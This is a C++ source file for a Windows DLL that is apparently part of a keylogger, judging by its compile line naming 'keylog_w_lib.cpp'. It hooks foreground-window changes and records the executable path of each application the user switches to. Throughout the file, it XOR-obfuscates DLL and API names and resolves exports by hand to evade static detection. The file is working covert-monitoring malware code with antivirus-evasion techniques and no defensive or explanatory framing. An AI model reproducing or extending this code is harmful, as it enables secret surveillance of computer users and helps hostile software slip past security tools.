//cl /EHsc /LD .\keylog_w_lib.cpp /link User32.lib
#include <Windows.h>
#include <mutex>
#include <string.h>
#include <psapi.h>
#include <vector>
#define DLL_EXPORT __declspec(dllexport)
#define HEX_K 0xFF
#define X_C(c) static_cast<char>((c) ^ HEX_K)
///////////////////////////////////////////////////////////////////////
HMODULE hUser32, hkernel32, hPsapi;
HWINEVENTHOOK hk;
std::vector<std::string>* sharedLogVector = nullptr;
std::mutex logMutex;
///////////////////////////////////////////////////////////////////////
void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);
///////////////////////////////////////////////////////////////////////

typedef HWINEVENTHOOK(WINAPI *Set_WinHuk_Fn)(UINT, UINT, HMODULE, WINEVENTPROC, DWORD, DWORD, UINT);
typedef BOOL(WINAPI *Un_huk_WinHuk_Fn)(HWINEVENTHOOK);
typedef DWORD(WINAPI *Get_Win_Thrd_Proc_Id_Fn)(HWND, LPDWORD);
typedef HANDLE(WINAPI *Opn_Proc_Fn)(DWORD, BOOL, DWORD);
typedef DWORD(WINAPI *Get_Module_FileNme_ExA_Fn)(HANDLE, HMODULE, LPSTR, DWORD);
typedef BOOL(WINAPI *Cls_Hnd_Fn)(HANDLE);

Set_WinHuk_Fn My_Set_WinDows_Huk;
Un_huk_WinHuk_Fn My_Unhuk_WinDows_Huk;
Get_Win_Thrd_Proc_Id_Fn My_Get_Win_Thrd_Proc_Id;
Opn_Proc_Fn My_Opn_Proc;
Get_Module_FileNme_ExA_Fn My_Get_Module_FileNme_ExA;
Cls_Hnd_Fn My_ClsHnd;

///////////////////////////////////////////////////////////////////////

void* FindExportAddress(HMODULE hModule, const char* funcName)
{
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
        if (strcmp(funcNameFromExport, funcName) == 0)
        {
            DWORD funcRVA = funcRVAs[ordRVAs[i]];
            return (void*)((BYTE*)hModule + funcRVA);

        }
    }
    std::string errorMsg = "Failed to find export address for function: ";
    errorMsg += funcName;
    MessageBoxA(NULL, errorMsg.c_str(), "Error", MB_OK);
    return nullptr;
}

DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
{

    char obf_Usr_32[] = { X_C('u'), X_C('s'), X_C('e'), X_C('r'), X_C('3'), X_C('2'), X_C('.'), X_C('d'), X_C('l'), X_C('l'), '\0'};
    char obf_Ker_32[] = { X_C('k'), X_C('e'), X_C('r'), X_C('n'), X_C('e'), X_C('l'), X_C('3'), X_C('2'), X_C('.'), X_C('d'), X_C('l'), X_C('l'), '\0'};
    char obf_Papi[] = { X_C('p'), X_C('s'), X_C('a'), X_C('p'), X_C('i'), X_C('.'), X_C('d'), X_C('l'), X_C('l'), '\0'};
    char obf_Set_Win_Evnt_Huk[] = { X_C('S'), X_C('e'), X_C('t'), X_C('W'), X_C('i'), X_C('n'), X_C('E'), X_C('v'), X_C('e'), X_C('n'), X_C('t'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), '\0' };
    char obf_Unhuk_Win_Huk[] = { X_C('U'), X_C('n'), X_C('h'), X_C('o'), X_C('o'), X_C('k'), X_C('W'), X_C('i'), X_C('n'), X_C('d'), X_C('o'), X_C('w'), X_C('s'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), '\0' };
    char obf_Get_Win_Thrd_Proc_Id[] = { X_C('G'), X_C('e'), X_C('t'), X_C('W'), X_C('i'), X_C('n'), X_C('d'), X_C('o'), X_C('w'), X_C('T'), X_C('h'), X_C('r'), X_C('e'), X_C('a'), X_C('d'), X_C('P'), X_C('r'), X_C('o'), X_C('c'), X_C('e'), X_C('s'), X_C('s'), X_C('I'), X_C('d'), '\0' };
    char obf_Opn_Proc[] = { X_C('O'), X_C('p'), X_C('e'), X_C('n'), X_C('P'), X_C('r'), X_C('o'), X_C('c'), X_C('e'), X_C('s'), X_C('s'), '\0' };
    char obf_K32_Get_Mod_Fil_Nm_ExA[] = { X_C('K'), X_C('3'), X_C('2'), X_C('G'), X_C('e'), X_C('t'), X_C('M'), X_C('o'), X_C('d'), X_C('u'), X_C('l'), X_C('e'), X_C('F'), X_C('i'), X_C('l'), X_C('e'), X_C('N'), X_C('a'), X_C('m'), X_C('e'), X_C('E'), X_C('x'), X_C('A'), '\0' };
    char obf_Get_Mod_Fil_Nm_ExA[] = { X_C('G'), X_C('e'), X_C('t'), X_C('M'), X_C('o'), X_C('d'), X_C('u'), X_C('l'), X_C('e'), X_C('F'), X_C('i'), X_C('l'), X_C('e'), X_C('N'), X_C('a'), X_C('m'), X_C('e'), X_C('E'), X_C('x'), X_C('A'), '\0' };
    char obf_Cls_Hnd[] = { X_C('C'), X_C('l'), X_C('o'), X_C('s'), X_C('e'), X_C('H'), X_C('a'), X_C('n'), X_C('d'), X_C('l'), X_C('e'), '\0' };

    for (int i = 0; obf_Usr_32[i] != '\0'; i++) obf_Usr_32[i] ^= HEX_K;
    for (int i = 0; obf_Ker_32[i] != '\0'; i++) obf_Ker_32[i] ^= HEX_K;
    for (int i = 0; obf_Papi[i] != '\0'; i++) obf_Papi[i] ^= HEX_K;
    for (int i = 0; obf_Set_Win_Evnt_Huk[i] != '\0'; i++) obf_Set_Win_Evnt_Huk[i] ^= HEX_K;
    for (int i = 0; obf_Unhuk_Win_Huk[i] != '\0'; i++) obf_Unhuk_Win_Huk[i] ^= HEX_K;
    for (int i = 0; obf_Get_Win_Thrd_Proc_Id[i] != '\0'; i++) obf_Get_Win_Thrd_Proc_Id[i] ^= HEX_K;
    for (int i = 0; obf_Opn_Proc[i] != '\0'; i++) obf_Opn_Proc[i] ^= HEX_K;
    for (int i = 0; obf_K32_Get_Mod_Fil_Nm_ExA[i] != '\0'; i++) obf_K32_Get_Mod_Fil_Nm_ExA[i] ^= HEX_K;
    for (int i = 0; obf_Get_Mod_Fil_Nm_ExA[i] != '\0'; i++) obf_Get_Mod_Fil_Nm_ExA[i] ^= HEX_K;
    for (int i = 0; obf_Cls_Hnd[i] != '\0'; i++) obf_Cls_Hnd[i] ^= HEX_K;


    hUser32 = (HMODULE)LoadLibraryA(obf_Usr_32);
    hkernel32 = (HMODULE)LoadLibraryA(obf_Ker_32);
    hPsapi = (HMODULE)LoadLibraryA(obf_Papi);
    My_Set_WinDows_Huk = (Set_WinHuk_Fn)FindExportAddress(hUser32, obf_Set_Win_Evnt_Huk);
    My_Unhuk_WinDows_Huk = (Un_huk_WinHuk_Fn)FindExportAddress(hUser32, obf_Unhuk_Win_Huk);
    My_Get_Win_Thrd_Proc_Id = (Get_Win_Thrd_Proc_Id_Fn)FindExportAddress(hUser32, obf_Get_Win_Thrd_Proc_Id);
    My_Opn_Proc = (Opn_Proc_Fn)FindExportAddress(hkernel32, obf_Opn_Proc);
    My_Get_Module_FileNme_ExA = (Get_Module_FileNme_ExA_Fn)FindExportAddress(hkernel32, obf_K32_Get_Mod_Fil_Nm_ExA);
        if (!My_Get_Module_FileNme_ExA) My_Get_Module_FileNme_ExA = (Get_Module_FileNme_ExA_Fn)FindExportAddress(hPsapi, obf_Get_Mod_Fil_Nm_ExA);   // for older systems
    My_ClsHnd = (Cls_Hnd_Fn)FindExportAddress(hkernel32, obf_Cls_Hnd);


    {
        std::lock_guard<std::mutex> lock(logMutex);
        sharedLogVector = logVector;
    }

    hk = My_Set_WinDows_Huk(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
}

DLL_EXPORT void Cleanup()
{
    if (hk && My_Unhuk_WinDows_Huk)
    {
        My_Unhuk_WinDows_Huk(hk);
        if (hUser32) FreeLibrary(hUser32);
        if (hkernel32) FreeLibrary(hkernel32);
        if (hPsapi) FreeLibrary(hPsapi);
        hk = nullptr;
    }
}

void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
    if (event == EVENT_SYSTEM_FOREGROUND) 
    {
        DWORD pid;
        My_Get_Win_Thrd_Proc_Id(hwnd, &pid);

        HANDLE hProcess = My_Opn_Proc(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess)
        {
            char processName[MAX_PATH];
            if (My_Get_Module_FileNme_ExA(hProcess, NULL, processName, MAX_PATH))
            {
                std::string entry = "\n===============[ " + std::string(processName) + " ]===============\n";
                {
                    std::lock_guard<std::mutex> lock(logMutex);
                    sharedLogVector->emplace_back(entry);
                }
            }
            My_ClsHnd(hProcess);
        }
    }
}
